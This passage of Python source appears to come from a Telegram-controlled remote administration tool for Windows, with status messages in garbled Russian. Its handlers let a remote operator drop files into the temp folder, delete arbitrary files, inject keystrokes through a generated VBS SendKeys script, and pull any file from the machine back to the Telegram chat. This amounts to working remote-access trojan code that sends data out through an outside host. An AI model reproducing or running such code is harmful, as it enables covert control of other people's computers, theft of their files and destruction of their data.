    with open(tempfile.gettempdir() + '\\' + originalfile_name, 'wb') as new_file:
        new_file.write(downloaded_file)
    bot.send_message(message.chat.id, '–§–∞–π–ª ' + originalfile_name + ' —Å–æ—Ö—Ä–∞–Ω–µ–Ω –ø–æ –ø—É—Ç–∏: ' + tempfile.gettempdir() + '\\' + originalfile_name)
def removefile(message):
    os.remove('{}'.format(message.text))
    bot.send_message(message.chat.id, '–§–∞–π–ª ' + '{}'.format(message.text) + ' —É–¥–∞–ª–µ–Ω!')
def sendkey(message):
    bot.send_message(message.chat.id, '–ù–∞–∂–∞—Ç–∞ –∫–ª–∞–≤–∏—à–∞: {}'.format(message.text))
    os.system("taskkill /f /im wscript.exe > nul")
    try:
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    except FileNotFoundError:
        print("File VBS are not created.")
    file_name = tempfile.gettempdir() + '\zebra.vbs'
    f = open(file_name, 'a+')
    f.write('Set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.SendKeys "' + '{}'.format(message.text) + '"')
    f.close()
    os.system(tempfile.gettempdir() + '\zebra.vbs')
    if "wscript.exe" in os.popen('wmic process get description').read():
        os.remove(tempfile.gettempdir() + '\zebra.vbs')
    print("Key Pressed!")
def downloadfile(message):
    bot.send_document(chat_id=message.chat.id, document=open('{}'.format(message.text), 'rb'))
    print("File Downloaded!")



try:
    bot.polling(none_stop=True, interval=0)
except SystemExit:
    print("Trying to exit!!")





